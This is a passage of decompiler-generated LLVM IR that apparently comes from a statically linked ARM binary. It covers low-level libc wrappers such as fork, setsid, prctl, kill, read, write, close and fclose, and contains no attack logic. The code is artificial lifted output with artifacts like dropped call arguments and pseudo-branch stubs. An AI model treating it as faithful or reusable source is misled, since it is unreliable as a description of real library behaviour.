  store i32 %v0_f714, i32* @r0, align 4
  %v0_f718 = call i32 @free()
  br label %dec_label_pc_f724

dec_label_pc_f720:                                ; preds = %dec_label_pc_f70c, %dec_label_pc_f69c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_f724

dec_label_pc_f724:                                ; preds = %dec_label_pc_f700.thread7, %bb19, %dec_label_pc_f700, %dec_label_pc_f714, %dec_label_pc_f664, %dec_label_pc_f720
  %v0_f724 = load i32, i32* @r4, align 4
  store i32 %v3_f648, i32* @r4, align 4
  store i32 %v6_f648, i32* @r5, align 4
  store i32 %v9_f648, i32* @r6, align 4
  store i32 %v12_f648, i32* @r7, align 4
  ret i32 %v0_f724

; uselistorder directives
  uselistorder i32 %v0_f6f4, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v1_f6a0, { 1, 0, 2 }
  uselistorder i32 %v0_f678, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_f724, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_f6b0, { 1, 0 }
  uselistorder label %dec_label_pc_f69c, { 0, 2, 1 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_f740 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 96) to i32*), align 4
  %v1_f744 = inttoptr i32 %v4_f740 to i32*
  %v2_f744 = load i32, i32* %v1_f744, align 4
  %v2_f748 = icmp eq i32 %v2_f744, 0
  br i1 %v2_f748, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_f750 = phi i32 [ %v2_f744, %entry ], [ 4096, %bb ]
  ret i32 %v1_f750

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_getpid() local_unnamed_addr {
entry:
  %v1_f76c = load i32, i32* @r0, align 4
  ret i32 %v1_f76c
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_f774 = ptrtoint i32* %stack_var_-16 to i32
  %v2_f784 = call i32 @gettimeofday(i32 %v2_f774, i32 0)
  %v2_f788 = load i32, i32* %stack_var_-16, align 4
  %v2_f78c = icmp eq i32* %arg1, null
  br i1 %v2_f78c, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_f788, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_f788

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f7d4, label %dec_label_pc_f7c4

dec_label_pc_f7c4:                                ; preds = %entry
  %v0_f7c4 = call i32 @__GI___errno_location()
  %v0_f7c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_f7c8 = sub i32 0, %v0_f7c8
  %v2_f7cc = inttoptr i32 %v0_f7c4 to i32*
  store i32 %v1_f7c8, i32* %v2_f7cc, align 4
  br label %dec_label_pc_f7d4

dec_label_pc_f7d4:                                ; preds = %entry, %dec_label_pc_f7c4
  %v1_f7dc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_f7c4 ]
  ret i32 %v1_f7dc

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f7d4, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f7e0 = load i32, i32* @r7, align 4
  store i32 %v3_f7e0, i32* %stack_var_-8, align 4
  %v0_f7ec = load i32, i32* @r0, align 4
  store i32 %v0_f7ec, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f7ec, -4095
  br i1 %tmp, label %dec_label_pc_f80c, label %dec_label_pc_f7fc

dec_label_pc_f7fc:                                ; preds = %entry
  %v0_f7fc = call i32 @__GI___errno_location()
  %v0_f800 = load i32, i32* %r7.global-to-local, align 4
  %v1_f800 = sub i32 0, %v0_f800
  %v2_f804 = inttoptr i32 %v0_f7fc to i32*
  store i32 %v1_f800, i32* %v2_f804, align 4
  %v2_f80c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f80c

dec_label_pc_f80c:                                ; preds = %entry, %dec_label_pc_f7fc
  %v1_f810 = phi i32 [ %v0_f7ec, %entry ], [ -1, %dec_label_pc_f7fc ]
  %v2_f80c = phi i32 [ %v3_f7e0, %entry ], [ %v2_f80c.pre, %dec_label_pc_f7fc ]
  store i32 %v2_f80c, i32* @r7, align 4
  ret i32 %v1_f810

; uselistorder directives
  uselistorder i32 %v0_f7ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f80c, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_f820 = call i32 @wait4()
  ret i32 %v0_f820
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f860, label %dec_label_pc_f850

dec_label_pc_f850:                                ; preds = %entry
  %v0_f850 = call i32 @__GI___errno_location()
  %v0_f854 = load i32, i32* %r4.global-to-local, align 4
  %v1_f854 = sub i32 0, %v0_f854
  %v2_f858 = inttoptr i32 %v0_f850 to i32*
  store i32 %v1_f854, i32* %v2_f858, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f860

dec_label_pc_f860:                                ; preds = %entry, %dec_label_pc_f850
  %v0_f860 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_f850 ]
  ret i32 %v0_f860

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f860, { 1, 0 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f870 = load i32, i32* @r7, align 4
  store i32 %v3_f870, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f898, label %dec_label_pc_f888

dec_label_pc_f888:                                ; preds = %entry
  %v0_f888 = call i32 @__GI___errno_location()
  %v0_f88c = load i32, i32* %r7.global-to-local, align 4
  %v1_f88c = sub i32 0, %v0_f88c
  %v2_f890 = inttoptr i32 %v0_f888 to i32*
  store i32 %v1_f88c, i32* %v2_f890, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_f89c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f898

dec_label_pc_f898:                                ; preds = %entry, %dec_label_pc_f888
  %v2_f89c = phi i32 [ %v3_f870, %entry ], [ %v2_f89c.pre, %dec_label_pc_f888 ]
  %v0_f898 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_f888 ]
  store i32 %v2_f89c, i32* @r7, align 4
  ret i32 %v0_f898

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f898, { 1, 0 }
}

define i32 @__GI_read(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f8a4 = load i32, i32* @r7, align 4
  store i32 %v3_f8a4, i32* %stack_var_-8, align 4
  %v0_f8b0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f8b0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f8b0, -4095
  br i1 %tmp, label %dec_label_pc_f8d0, label %dec_label_pc_f8c0

dec_label_pc_f8c0:                                ; preds = %entry
  %v0_f8c0 = call i32 @__GI___errno_location()
  %v0_f8c4 = load i32, i32* %r7.global-to-local, align 4
  %v1_f8c4 = sub i32 0, %v0_f8c4
  %v2_f8c8 = inttoptr i32 %v0_f8c0 to i32*
  store i32 %v1_f8c4, i32* %v2_f8c8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_f8d0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f8d0

dec_label_pc_f8d0:                                ; preds = %entry, %dec_label_pc_f8c0
  %v1_f8d4 = phi i32 [ %v0_f8b0, %entry ], [ -1, %dec_label_pc_f8c0 ]
  %v2_f8d0 = phi i32 [ %v3_f8a4, %entry ], [ %v2_f8d0.pre, %dec_label_pc_f8c0 ]
  store i32 %v2_f8d0, i32* @r7, align 4
  ret i32 %v1_f8d4

; uselistorder directives
  uselistorder i32 %v0_f8b0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f8d0, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_f8dc = ptrtoint i32* %stack_var_-16 to i32
  %v2_f8e8 = call i32 @getrlimit(i32 7, i32 %v2_f8dc)
  %v1_f8ec = icmp slt i32 %v2_f8e8, 0
  %v5_f8f0 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_f8ec, i32 256, i32 %v5_f8f0
  ret i32 %storemerge
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f904 = load i32, i32* @r7, align 4
  store i32 %v3_f904, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f92c, label %dec_label_pc_f91c

dec_label_pc_f91c:                                ; preds = %entry
  %v0_f91c = call i32 @__GI___errno_location()
  %v0_f920 = load i32, i32* %r7.global-to-local, align 4
  %v1_f920 = sub i32 0, %v0_f920
  %v2_f924 = inttoptr i32 %v0_f91c to i32*
  store i32 %v1_f920, i32* %v2_f924, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_f930.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f92c

dec_label_pc_f92c:                                ; preds = %entry, %dec_label_pc_f91c
  %v2_f930 = phi i32 [ %v3_f904, %entry ], [ %v2_f930.pre, %dec_label_pc_f91c ]
  %v0_f92c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_f91c ]
  store i32 %v2_f930, i32* @r7, align 4
  ret i32 %v0_f92c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f92c, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f938 = load i32, i32* @r7, align 4
  store i32 %v3_f938, i32* %stack_var_-8, align 4
  %v0_f944 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f944, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f944, -4095
  br i1 %tmp, label %dec_label_pc_f964, label %dec_label_pc_f954

dec_label_pc_f954:                                ; preds = %entry
  %v0_f954 = call i32 @__GI___errno_location()
  %v0_f958 = load i32, i32* %r7.global-to-local, align 4
  %v1_f958 = sub i32 0, %v0_f958
  %v2_f95c = inttoptr i32 %v0_f954 to i32*
  store i32 %v1_f958, i32* %v2_f95c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_f964.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f964

dec_label_pc_f964:                                ; preds = %entry, %dec_label_pc_f954
  %v1_f968 = phi i32 [ %v0_f944, %entry ], [ -1, %dec_label_pc_f954 ]
  %v2_f964 = phi i32 [ %v3_f938, %entry ], [ %v2_f964.pre, %dec_label_pc_f954 ]
  store i32 %v2_f964, i32* @r7, align 4
  ret i32 %v1_f968

; uselistorder directives
  uselistorder i32 %v0_f944, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f964, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_f9a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f9a8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f9a8, -4095
  br i1 %tmp, label %dec_label_pc_f9c8, label %dec_label_pc_f9b8

dec_label_pc_f9b8:                                ; preds = %entry
  %v0_f9b8 = call i32 @__GI___errno_location()
  %v0_f9bc = load i32, i32* %r7.global-to-local, align 4
  %v1_f9bc = sub i32 0, %v0_f9bc
  %v2_f9c0 = inttoptr i32 %v0_f9b8 to i32*
  store i32 %v1_f9bc, i32* %v2_f9c0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f9c8

dec_label_pc_f9c8:                                ; preds = %entry, %dec_label_pc_f9b8
  %v1_f9d4 = phi i32 [ %v0_f9a8, %entry ], [ -1, %dec_label_pc_f9b8 ]
  ret i32 %v1_f9d4

; uselistorder directives
  uselistorder i32 %v0_f9a8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f9c8, { 1, 0 }
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_fa14 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_fa14, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_fa14, -4095
  br i1 %tmp, label %dec_label_pc_fa34, label %dec_label_pc_fa24

dec_label_pc_fa24:                                ; preds = %entry
  %v0_fa24 = call i32 @__GI___errno_location()
  %v0_fa28 = load i32, i32* %r7.global-to-local, align 4
  %v1_fa28 = sub i32 0, %v0_fa28
  %v2_fa2c = inttoptr i32 %v0_fa24 to i32*
  store i32 %v1_fa28, i32* %v2_fa2c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fa34

dec_label_pc_fa34:                                ; preds = %entry, %dec_label_pc_fa24
  %v1_fa40 = phi i32 [ %v0_fa14, %entry ], [ -1, %dec_label_pc_fa24 ]
  ret i32 %v1_fa40

; uselistorder directives
  uselistorder i32 %v0_fa14, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fa34, { 1, 0 }
}

define i32 @__GI_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fa44 = load i32, i32* @r7, align 4
  store i32 %v3_fa44, i32* %stack_var_-8, align 4
  %v0_fa50 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_fa50, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_fa50, -4095
  br i1 %tmp, label %dec_label_pc_fa70, label %dec_label_pc_fa60

dec_label_pc_fa60:                                ; preds = %entry
  %v0_fa60 = call i32 @__GI___errno_location()
  %v0_fa64 = load i32, i32* %r7.global-to-local, align 4
  %v1_fa64 = sub i32 0, %v0_fa64
  %v2_fa68 = inttoptr i32 %v0_fa60 to i32*
  store i32 %v1_fa64, i32* %v2_fa68, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_fa70.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fa70

dec_label_pc_fa70:                                ; preds = %entry, %dec_label_pc_fa60
  %v1_fa74 = phi i32 [ %v0_fa50, %entry ], [ -1, %dec_label_pc_fa60 ]
  %v2_fa70 = phi i32 [ %v3_fa44, %entry ], [ %v2_fa70.pre, %dec_label_pc_fa60 ]
  store i32 %v2_fa70, i32* @r7, align 4
  ret i32 %v1_fa74

; uselistorder directives
  uselistorder i32 %v0_fa50, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fa70, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fa78 = load i32, i32* @r7, align 4
  store i32 %v3_fa78, i32* %stack_var_-8, align 4
  %v0_fa84 = load i32, i32* @r0, align 4
  store i32 %v0_fa84, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_fa84, -4095
  br i1 %tmp, label %dec_label_pc_faa4, label %dec_label_pc_fa94

dec_label_pc_fa94:                                ; preds = %entry
  %v0_fa94 = call i32 @__GI___errno_location()
  %v0_fa98 = load i32, i32* %r7.global-to-local, align 4
  %v1_fa98 = sub i32 0, %v0_fa98
  %v2_fa9c = inttoptr i32 %v0_fa94 to i32*
  store i32 %v1_fa98, i32* %v2_fa9c, align 4
  %v2_faa4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_faa4

dec_label_pc_faa4:                                ; preds = %entry, %dec_label_pc_fa94
  %v1_faa8 = phi i32 [ %v0_fa84, %entry ], [ -1, %dec_label_pc_fa94 ]
  %v2_faa4 = phi i32 [ %v3_fa78, %entry ], [ %v2_faa4.pre, %dec_label_pc_fa94 ]
  store i32 %v2_faa4, i32* @r7, align 4
  ret i32 %v1_faa8

; uselistorder directives
  uselistorder i32 %v0_fa84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_faa4, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_faac = load i32, i32* @r3, align 4
  store i32 %v9_faac, i32* %stack_var_-4, align 4
  %v2_fab8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fab8, i32* @r3, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_faec, label %dec_label_pc_fadc

dec_label_pc_fadc:                                ; preds = %entry
  %v0_fadc = call i32 @__GI___errno_location()
  %v0_fae0 = load i32, i32* %r7.global-to-local, align 4
  %v1_fae0 = sub i32 0, %v0_fae0
  store i32 %v1_fae0, i32* @r3, align 4
  %v2_fae4 = inttoptr i32 %v0_fadc to i32*
  store i32 %v1_fae0, i32* %v2_fae4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_faec

dec_label_pc_faec:                                ; preds = %entry, %dec_label_pc_fadc
  %v0_faec = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_fadc ]
  ret i32 %v0_faec

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_faec, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fb04.outer

dec_label_pc_fb04.outer:                          ; preds = %dec_label_pc_fb1c, %entry
  %v0_fb04.ph = phi i32 [ %v0_fb04.pre.pre, %dec_label_pc_fb1c ], [ %arg1, %entry ]
  %tmp = icmp ult i32 %v0_fb04.ph, -4095
  br label %dec_label_pc_fb04

dec_label_pc_fb04:                                ; preds = %dec_label_pc_fb04.outer, %dec_label_pc_fb04
  br i1 %tmp, label %dec_label_pc_fb04, label %dec_label_pc_fb1c

dec_label_pc_fb1c:                                ; preds = %dec_label_pc_fb04
  %v0_fb1c = call i32 @__GI___errno_location()
  %v1_fb20 = sub i32 0, %v0_fb04.ph
  %v2_fb24 = inttoptr i32 %v0_fb1c to i32*
  store i32 %v1_fb20, i32* %v2_fb24, align 4
  %v0_fb04.pre.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fb04.outer

; uselistorder directives
  uselistorder i32 %v0_fb04.ph, { 1, 0 }
  uselistorder label %dec_label_pc_fb04, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fb2c = load i32, i32* @r7, align 4
  store i32 %v3_fb2c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_fb58, label %dec_label_pc_fb48

dec_label_pc_fb48:                                ; preds = %entry
  %v0_fb48 = call i32 @__GI___errno_location()
  %v0_fb4c = load i32, i32* %r7.global-to-local, align 4
  %v1_fb4c = sub i32 0, %v0_fb4c
  %v2_fb50 = inttoptr i32 %v0_fb48 to i32*
  store i32 %v1_fb4c, i32* %v2_fb50, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_fb5c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fb58

dec_label_pc_fb58:                                ; preds = %entry, %dec_label_pc_fb48
  %v2_fb5c = phi i32 [ %v3_fb2c, %entry ], [ %v2_fb5c.pre, %dec_label_pc_fb48 ]
  %v0_fb58 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_fb48 ]
  store i32 %v2_fb5c, i32* @r7, align 4
  ret i32 %v0_fb58

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fb58, { 1, 0 }
}

define i32 @__GI_close(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fb64 = load i32, i32* @r7, align 4
  store i32 %v3_fb64, i32* %stack_var_-8, align 4
  %v0_fb70 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_fb70, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_fb70, -4095
  br i1 %tmp, label %dec_label_pc_fb90, label %dec_label_pc_fb80

dec_label_pc_fb80:                                ; preds = %entry
  %v0_fb80 = call i32 @__GI___errno_location()
  %v0_fb84 = load i32, i32* %r7.global-to-local, align 4
  %v1_fb84 = sub i32 0, %v0_fb84
  %v2_fb88 = inttoptr i32 %v0_fb80 to i32*
  store i32 %v1_fb84, i32* %v2_fb88, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_fb90.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fb90

dec_label_pc_fb90:                                ; preds = %entry, %dec_label_pc_fb80
  %v1_fb94 = phi i32 [ %v0_fb70, %entry ], [ -1, %dec_label_pc_fb80 ]
  %v2_fb90 = phi i32 [ %v3_fb64, %entry ], [ %v2_fb90.pre, %dec_label_pc_fb80 ]
  store i32 %v2_fb90, i32* @r7, align 4
  ret i32 %v1_fb94

; uselistorder directives
  uselistorder i32 %v0_fb70, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fb90, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v4_fba4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 1824) to i32*), align 4
  %v2_fba8 = mul i32 %arg1, 2
  %v2_fbac = add i32 %v4_fba4, %v2_fba8
  %v3_fbac = inttoptr i32 %v2_fbac to i16*
  %v4_fbac = load i16, i16* %v3_fbac, align 2
  %v6_fbac = zext i16 %v4_fbac to i32
  %v1_fbb0 = and i32 %v6_fbac, 32
  ret i32 %v1_fbb0
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_fbc4 = add i32 %arg1, 128
  %v2_fbc8 = icmp ugt i32 %v1_fbc4, 383
  %v0_fbd0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_fbc8, i32 %v0_fbd0)
  %v4_fbd8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 1832) to i32*), align 4
  %v2_fbdc = mul i32 %arg1, 2
  %v2_fbe0 = add i32 %v4_fbd8, %v2_fbdc
  %v3_fbe0 = inttoptr i32 %v2_fbe0 to i16*
  %v4_fbe0 = load i16, i16* %v3_fbe0, align 2
  %v6_fbe0 = sext i16 %v4_fbe0 to i32
  ret i32 %v6_fbe0
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r3, align 4
  ret i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 27604)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_fc0c = load i32, i32* @r4, align 4
  store i32 %v3_fc0c, i32* %stack_var_-36, align 4
  %v6_fc0c = load i32, i32* @r5, align 4
  %v9_fc0c = load i32, i32* @r6, align 4
  %v12_fc0c = load i32, i32* @r7, align 4
  %v15_fc0c = load i32, i32* @r8, align 4
  %v27_fc0c = load i32, i32* @lr, align 4
  %v2_fc10 = add i32 %tmp, 52
  %v3_fc10 = inttoptr i32 %v2_fc10 to i32*
  %v4_fc10 = load i32, i32* %v3_fc10, align 4
  %v1_fc18 = sub i32 1, %v4_fc10
  %v2_fc18 = icmp ult i32 %v4_fc10, 2
  br i1 %v2_fc18, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_fc18, %entry ]
  %v0_fc20 = phi i32 [ 0, %bb ], [ %v1_fc18, %entry ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v2_fc20 = icmp eq i32 %v0_fc20, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r6, align 4
  br i1 %v2_fc20, label %dec_label_pc_fc6c, label %dec_label_pc_fc34

dec_label_pc_fc34:                                ; preds = %thread-pre-split
  %v4_fc4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_fc4c)
  %v0_fc60 = load i32, i32* @r6, align 4
  %v2_fc60 = add i32 %v0_fc60, 16
  %v3_fc60 = inttoptr i32 %v2_fc60 to i32*
  %v4_fc60 = load i32, i32* %v3_fc60, align 4
  call void @__pseudo_branch(i32 %v4_fc60)
  %v0_fc6c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_fc6c

dec_label_pc_fc6c:                                ; preds = %thread-pre-split, %dec_label_pc_fc34
  %v1_fc74 = phi i32 [ %tmp, %thread-pre-split ], [ %v0_fc6c.pre, %dec_label_pc_fc34 ]
  %v1_fc6c = inttoptr i32 %v1_fc74 to i16*
  %v2_fc6c = load i16, i16* %v1_fc6c, align 2
  %v3_fc6c = zext i16 %v2_fc6c to i32
  %v1_fc70 = and i32 %v3_fc6c, 64
  %v2_fc70 = icmp eq i32 %v1_fc70, 0
  br i1 %v2_fc70, label %bb18, label %bb17

bb17:                                             ; preds = %dec_label_pc_fc6c
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_fc6c, %bb17
  %storemerge24 = phi i32 [ %v1_fc74, %bb17 ], [ %v1_fc70, %dec_label_pc_fc6c ]
  %v1_fc78 = xor i1 %v2_fc70, true
  call void @__pseudo_cond_branch(i1 %v1_fc78, i32 ptrtoint (i32* @global_var_11724.594 to i32))
  store i32 %storemerge24, i32* %sl.global-to-local, align 4
  %v0_fc80 = load i32, i32* @r5, align 4
  %v1_fc80 = add i32 %v0_fc80, 4
  %v2_fc80 = inttoptr i32 %v1_fc80 to i32*
  %v3_fc80 = load i32, i32* %v2_fc80, align 4
  %v1_fc84 = call i32 @__GI_close(i32 %v3_fc80)
  %v0_fc8c = load i32, i32* @r6, align 4
  %v2_fc98 = add i32 %v0_fc8c, 112
  %v3_fc98 = inttoptr i32 %v2_fc98 to i32*
  %v4_fc98 = load i32, i32* %v3_fc98, align 4
  store i32 %v4_fc98, i32* @r7, align 4
  %v1_fca0 = load i32, i32* @r5, align 4
  %v2_fca0 = add i32 %v1_fca0, 4
  %v3_fca0 = inttoptr i32 %v2_fca0 to i32*
  store i32 -1, i32* %v3_fca0, align 4
  %v0_fca8 = load i32, i32* @r6, align 4
  %v2_fca8 = add i32 %v0_fca8, 76
  %v3_fca8 = inttoptr i32 %v2_fca8 to i32*
  %v4_fca8 = load i32, i32* %v3_fca8, align 4
